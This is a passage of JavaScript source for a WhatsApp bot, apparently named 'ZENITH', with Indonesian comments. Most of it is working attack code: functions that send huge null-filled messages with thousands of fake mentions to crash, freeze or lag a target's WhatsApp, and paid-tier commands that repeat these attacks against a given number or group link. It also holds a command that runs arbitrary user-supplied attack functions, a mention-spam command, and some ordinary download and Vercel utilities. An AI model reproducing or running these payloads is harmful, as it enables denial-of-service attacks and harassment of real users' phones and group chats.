  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }

/*
Delay Invisible one hit
Saran lop 1-2 Mesagge 
Sedot Kouta perdetik 
Not tag broadcast 
*/

async function sangek(depayy, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }
   
   

async function dileycok(depayy, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await new Promise(resolve => setTimeout(resolve, 500));

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(500000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
async function kacunk(depayy, target) {
  var msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "k",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await depayy.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
// Function Diley
async function dingleyhard(depayy, isTarget, ptcp = true) {
  const mentionedJidList = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1917 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
  ];

  const callPermissionMessage = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "#KicauMuani😹💦",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(10000),
            version: 3
          },
          contextInfo: {
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  };

  const addressMessage = {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\
                    "values": {\
                        "in_pin_code": "999999",\
                        "building_name": "KANJUT",\
                        "landmark_area": "H",\
                        "address": "XT",\
                        "tower_number": "XTX",\
                        "city": "Garut",\
                        "name": "Jawa_Barat",\
                        "phone_number": "999999999999",\
                        "house_number": "xxx",\
                        "floor_number": "xxx",\
                        "state": "D | ${"\u0000".repeat(900000)}"\
                    }\
                }`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363403941803439@newsletter",
          newsletterName: "idk",
          serverMessageId: 1000,
          accessibilityText: "idk"
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: isTarget,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
    }
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              isTarget ,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: isTarget,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { 
                    text: "V-Arven For You¿?", 
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 1000; r++) {
    const payload = generateWAMessageFromContent(isTarget, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "#BY22",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "{}"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await depayy.relayMessage(isTarget , {
      groupStatusMessageV2: {
        message: payload.message,
      },
    }, ptcp ? {
      messageId: payload.key.id,
      participant: { jid: isTarget }
    } : {
      messageId: payload.key.id
    });
    await sleep(1000);
  }

  await depayy.relayMessage(isTarget, callPermissionMessage, {
    groupId: null,
    participant: { jid: isTarget }
  });

  await depayy.relayMessage(isTarget, addressMessage, {
    participant: { jid: isTarget }
  });

  const msgLite = generateWAMessageFromContent(isTarget , stickerMsg, {});
  await depayy.relayMessage("status@broadcast", msgLite.message, {
    messageId: msgLite.key.id,
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: isTarget },
          content: undefined
        }]
      }]
    }]
  });
}
// Fangsen Grup
 async function begalGb(depayy, groupJid) {
const MakLo = {
  groupStatusMessageV2: {
    message: {
     extendedTextMessage: {
       text: "\u0000".repeat(550000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     };
     
   const msg = generateWAMessageFromContent(groupJid, MakLo, {});
        
     await sock.relayMessage(groupJid, msg.message, {
            messageId: msg.key.id
        });
     }
async function Blank(GroupJid) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "zenith is here" + "ꦾ".repeat(130000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(130000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "\u0000".repeat(1000),
          },
          {
            name: "galaxy_message",
            paramsJson: {
              "screen_2_OptIn_0": true,
              "screen_2_OptIn_1": true,
              "screen_1_Dropdown_0": "ꦽ".repeat(1000),
              "screen_1_DatePicker_1": "1028995200000",
              "screen_1_TextInput_2": "support@support.whatsapp.com",
              "screen_1_TextInput_3": "94643116",
              "screen_0_TextInput_0": "ꦽ".repeat(5000),
              "screen_0_TextInput_1": "newsletterAdminInvitMessage",
              "screen_0_Dropdown_2": "#926-Xnull",
              "screen_0_RadioButtonsGroup_3": "0_true",
              "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => "0@s.whatsapp.net"),
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "zenith Is Here",
          },
        ],
      },
    };

    await depayy.relayMessage(GroupJid, message, {
      userJid: GroupJid,
    });
  } catch (err) {
    console.error("Error:", err);
  }
}

// Case Test Function
case "testfunction": {
    if (!isCreator) return payreply(mess.owner);
    if (!text.includes("|"))
        return payreply(
`Gunakan format yang benar contoh:
.testfunction Nomor|Loop|async function maklu(target)\nawait maklu(target)
`
        );

    const [nomorRaw, loopRaw, funcFull] = text.split("|");  
    const nomor = nomorRaw.replace(/[^0-9]/g, "");  
    const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 1000));  

    if (!nomor) return payreply("❌ Nomor tidak valid!");  
    if (!funcFull) return payreply("❌ Masukkan function async yang benar!");  

    const target = nomor + "@s.whatsapp.net";  
    const sandbox = {  
        depayy,  
        target,  
        console,  
        Buffer,  
        sleep: (ms) => new Promise(r => setTimeout(r, ms)),  
        generateWAMessageFromContent,  
        proto  
    };  

    const context = vm.createContext(sandbox);
    const funcNameMatch = funcFull.match(/async function (\w+)/);
    const funcName = funcNameMatch ? funcNameMatch[1] : "UnknownFunction";
    let adaError = false;

    for (let i = 0; i < jumlah; i++) {
    try {
        await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
    } catch (err) {
        adaError = true;
        await payreply(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
        console.log("Error exec:", err);
        break;
    }

    await sandbox.sleep(300); //delay mamaklu
}

if (!adaError) {
    replybug2(
`⏤ *[ 𝗡𝗜𝗞𝗔 𝗩𝟮𝟯 ]* ⏤
ᯓ Function : ${funcName}
ᯓ Target : ${nomor}
ᯓ Loop : ${jumlah}
ᯓ Status : Success ✅
`
    );
}

break;
}

// Case Bak Grup
case 'Kill-gb':
case 'blank-gb': {
    if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
    
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/);
    if (!match) return payreply(`*Format Salah!*\nContoh: ${command} https://chat.whatsapp.com/xxxxxx`);

    let linkCode = match[1];

    try {
        let GroupJid = await depayy.groupAcceptInvite(linkCode);

        replybug2(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Processing ⏳
> Please wait`);

        await sleep(3000);

        for (let r = 0; r < 105; r++) {
            await Blank(GroupJid);
            await Blank(GroupJid);
            await sleep(5000);
        }
        
        replybug2(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`);

    } catch (err) {
        console.error("ERROR:", err);
        return payreply(`Gagal mengeksekusi!\n\n*Detail:* ${err}`);
    }
}
break;

case 'delay-gb':
case 'blank-gb': {
    if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
    
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/);
    if (!match) return payreply(`*Format Salah!*\nContoh: ${command} https://chat.whatsapp.com/xxxxxx`);

    let linkCode = match[1];

    try {
        let GroupJid = await depayy.groupAcceptInvite(linkCode);

        replybug2(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Processing ⏳
> Please wait`);

        await sleep(3000);

        for (let r = 0; r < 105; r++) {
            await begalGb(depayy, groupJid)
            await begalGb(depayy, groupJid)
            await sleep(2000);
        }
        
        replybug2(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`);

    } catch (err) {
        console.error("ERROR:", err);
        return payreply(`Gagal mengeksekusi!\n\n*Detail:* ${err}`);
    }
}
break;

// Case Bak //case delay bebas spam
case 'delay-spam': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 130; i++) {
await dileycok(depayy, target)
await dileycok(depayy, target)
}
}
break

case 'crash':
case 'fc-invis':
case 'forclose': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
const mention = [target]
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await Fcinpis(depayy, target, true)
await Fcinpis(depayy, target, true)
}
}
break

case 'ken-crashv2': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
const mention = [target]
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await F4x(depayy, target)
await F4x(depayy, target)
}
}
break


case 'ken-forclose': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
const mention = [target]
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await FcF4X(depayy, target)
await FcF4X(depayy, target)
}
}
break

case 'crash-onemsg': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
const mention = [target]
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 1; i++) {
await crasHidd(target)
await crasHidd(target)
}
}
break

case 'zenith-bulldozerv2':
case 'zenith-delay':
case 'zenith-bulldozer': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 50; i++) {
await dileycok(depayy, target)
await dileycok(depayy, target)
await sangek(depayy, target)
await ngaceng(depayy, target)
}
}
break

case 'delay-god':
case 'delay-zenith':
case 'delay-hard':
case 'delay-maker': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 50; i++) {
await sangek(depayy, target)
await ngaceng(depayy, target)
}
}
break

case 'blank-one':
case 'frezee-chat':
case 'blank-zenith': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await sendAllMessages(depayy, target)
await sendAllMessages(depayy, target)
await sleep(1500)
}
}
break
case 'ios-attack':
case 'zenith-ios': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝐙𝐄𝐍𝐈𝐓𝐇 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`)
for (let i = 0; i < 10; i++) {
await FrezeeChat(depayy, target)
await FrezeeChat(depayy, target)
}
}

case "getpp": {

let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!target) return payreply("Reply/@tag target nya")

var ppuser
try {
ppuser = await depayy.profilePictureUrl(target, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ejy4ky.jpg'
}
return depayy.sendMessage(m.chat, {image: {url: ppuser}, caption: `Sukses mengambil profil @${target.split("@")[0]}`, mentions: target}, {quoted: lol})
}
break





case "tiktokslide":
case "ttslide": {
try {

if (!text) return payreply("contoh: .ttslide https://vt.tiktok.com/xxxxx")

payreply("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")

const axios = require("axios")

let res = await axios.post("https://tikwm.com/api/", {
url: text
})

let data = res.data.data

if (!data.images || data.images.length === 0) {
return payreply("❌ Video ini bukan TikTok slide")
}

const cards = await Promise.all(data.images.map(async (img, i) => ({
header: {
title: `TikTok Slide #${i+1}`,
hasMediaAttachment: true,
imageMessage: (await generateWAMessageContent({
image: { url: img }
},{
upload: depayy.waUploadToServer
})).imageMessage
},
body: {
text: data.title || "TikTok Slide"
},
footer: {
text: data.author.nickname
},
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Buka TikTok",
url: text
})
}
]
}
})))

const msg = generateWAMessageFromContent(m.chat,{
viewOnceMessage:{
message:{
interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body:{ text:"📸 TikTok Slide Downloader" },
footer:{ text:"Ken ganteng" },
carouselMessage:{ cards }
})
}
}
},{ quoted:m })

await depayy.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

// kirim audio tiktok
await depayy.sendMessage(m.chat,{
audio:{ url: data.music },
mimetype:"audio/mpeg",
ptt:false
},{ quoted:m })

} catch (err) {

console.log("❌ ERROR TTSLIDE:", err)
payreply("❌ gagal mengambil slide TikTok")

}

}
break

case "swdl2": 

case "swdl2": 

case "swdl2": 

case "swdl2":
case "getsw": {
if (!isOwner) return payreply("Khusus owner!")

if (!m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
return payreply("Reply ke status (story) yang ingin didownload!")
}

const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage

let mediaType
let mediaMessage

await depayy.sendMessage(m.chat, {
react: {
text: "✅",
key: m.key
}
})

if (quoted.imageMessage) {
mediaType = "image"
mediaMessage = quoted.imageMessage
} else if (quoted.videoMessage) {
mediaType = "video"
mediaMessage = quoted.videoMessage
} else {
return payreply("Story yang direply bukan gambar atau video!")
}

try {
const stream = await downloadContentFromMessage(
mediaMessage,
mediaType
)

let buffer = Buffer.from([])

for await (const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}

await depayy.sendMessage(
m.chat,
{
[mediaType]: buffer,
caption: "✅ Berhasil mendownload story!"
},
{
quoted: m
}
)

} catch (err) {
console.error(err)
return payreply(`Error:\n${err.message}`)
}
}
break

case "copy": {
 if (!m.isGroup) return payreply("Command ini cuma bisa dipakai di grup 👥");

 // pastikan user membalas pesan
 if (!quoted || !quoted.sender) return payreply("Reply pesan orang yang ingin di-copy nomornya!");

 // ambil nomor user yang di-Reply
 let nomor = quoted.sender.split('@')[0];

 let teks = `🟢 Nomor User\n╰┈➤ *${nomor}*`;

 // Buat pesan interaktif persis style copyme
 let msgii = await generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessageV2Extension: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{
 "display_text":"SALIN NOMOR",
 "id":"copy_number",
 "copy_code":"${nomor}"
 }`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{
 "display_text":"CHAT NOMOR",
 "url":"https://wa.me/${nomor}"
 }`
 }
 ]
 })
 })
 }
 }
 },
 { userJid: m.sender, quoted: m }
 );

 // Kirim pesan
 await depayy.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;



case "copyme": {
 if (!m.isGroup) return payreply("Command ini cuma bisa dipakai di grup 👥");

 let nomor = m.sender.split('@')[0]; // ambil nomor tanpa @

 let teks = `🟢 Nomor Kamu\n╰┈➤ *${nomor}*`;

 // Buat pesan interaktif persis style cekidch
 let msgii = await generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessageV2Extension: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "cta_copy",
 "buttonParamsJson": `{
 "display_text":"SALIN NOMOR",
 "id":"copy_number",
 "copy_code":"${nomor}"
 }`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{
 "display_text":"CHAT NOMOR",
 "url":"https://wa.me/${nomor}"
 }`
 }
 ]
 })
 })
 }
 }
 },
 { userJid: m.sender, quoted: m }
 );

 // Kirim pesan
 await depayy.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
}
break;

case 'tag':
case 'spamtag': {
 if (!isCreator) return payreply(mess.owner)
 if (!m.isGroup) return payreply('Command ini cuma bisa dipakai di grup 👥');

 if (!text) return payreply(`Contoh penggunaan:\n${prefix}tag @agus 10 *(maksimal 50)*`);

 let [mentionText, countText] = text.split(' ');
 if (!mentionText.startsWith('@')) return payreply('Harus tag user pakai @');

 let count = parseInt(countText) || 1;
 if (count > 50) count = 50;

 // Ambil participant dari group metadata
 let participants = m.metadata?.participants || [];
 let target = participants.find(p => {
 let jidNum = p.id.split('@')[0];
 return jidNum === mentionText.replace('@', '');
 });

 if (!target) return payreply('User tidak ditemukan di grup!');

 // Kirim pesan
 for (let i = 0; i < count; i++) {
 await depayy.sendMessage(
 m.chat,
 {
 text: `Hai @${target.id.split('@')[0]}! Ini mention ke-${i+1}`,
 mentions: [target.id]
 },
 { quoted: m }
 );
 }

 payreply(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
}
break;

case "listweb": {
 if (!isCreator) return payreply(mess.owner)
 if (!global.vercelToken) return payreply('❌ Token Vercel belum diset!')

 try {
 let res = await fetch('https://api.vercel.com/v9/projects', {
 headers: {
 Authorization: `Bearer ${global.vercelToken}`
 }
 })

 let json = await res.json()

 if (!json.projects || json.projects.length === 0) {
 return payreply('📭 Tidak ada website!')
 }

 let teks = `🌐 *LIST WEBSITE KEN*\n\n`

 json.projects.forEach((v, i) => {
 teks += `${i+1}. ${v.name}\n`
 teks += `🔗 https://${v.name}.vercel.app\n\n`
 })

 payreply(teks)

 } catch (e) {
 console.log(e)
 payreply('❌ Gagal mengambil data!')
 }
}
break;

case "delweb": {
 if (!isCreator) return payreply(mess.owner)
 if (!text) return payreply('📌 Contoh:\n.delweb namaproject')
 if (!global.vercelToken) return payreply('❌ Token Vercel belum diset!')

 const webName = text.trim().toLowerCase()

 let msg = await payreply(`⏳ Menghapus *${webName}*...`)

 try {
 let res = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
 method: "DELETE",
 headers: {
 Authorization: `Bearer ${global.vercelToken}`
 }
 })

 if (res.status === 200 || res.status === 204) {
 return depayy.sendMessage(m.chat, {
 text: `✅ Website *${webName}* berhasil dihapus!`,
 edit: msg.key
 })
 } else if (res.status === 404) {
 return depayy.sendMessage(m.chat, {
 text: `⚠️ Website tidak ditemukan!`,
 edit: msg.key
 })
 } else {
 return depayy.sendMessage(m.chat, {
 text: `❌ Gagal hapus website!`,
 edit: msg.key
 })
 }

 } catch (e) {
 console.log(e)
 depayy.sendMessage(m.chat, {
 text: `❌ Error saat hapus!`,
 edit: msg.key
 })
 }
}
break;

case "school-track": {
 if (!q) return payreply(`🏫 *School Tracker*\n\nFormat: .schooltrack nama sekolah | kota\nContoh: .schooltrack sman 1 | jakarta`);

 const [namaSekolah, daerah] = text.split('|').map(str => str.trim());
 if (!namaSekolah || !daerah) return payreply('❌ Format salah!');

 const statusMsg = await payreply(`🔍 Mencari: ${namaSekolah} di ${daerah}...`);

 const apis = [
